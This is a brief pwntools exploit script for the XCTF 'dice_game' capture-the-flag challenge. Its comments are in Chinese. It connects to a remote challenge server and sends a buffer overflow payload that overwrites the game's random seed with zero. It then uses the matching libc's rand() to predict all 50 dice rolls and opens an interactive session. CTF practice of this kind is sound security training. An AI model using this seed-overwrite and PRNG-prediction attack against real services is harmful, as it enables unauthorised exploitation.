# zzPwn Header Start
from pwn import *
from zzPwnlib import *
from LibcSearcher import *
context(os='linux', arch='amd64', log_level='debug')

elf_path    = './xctf_pwn_105_dice_game'
elf         = ELF(elf_path)
#io          = process(elf_path)
io          = remote('111.200.241.244',64992)
# zzPwn Header End

# 引入ctypes，调用rand()函数
from ctypes import cdll
libc = cdll.LoadLibrary("./xctf_pwn_105_libc.so.6")

# 缓冲区溢出，覆盖seed
payload = b"A"*0x40 + p32(0)
payload = payload.ljust(0x50, b"B")

io.recv()
io.send(payload)

for n in range(50):
    io.recv()
    io.sendline(str(libc.rand()%6+1))

io.interactive()

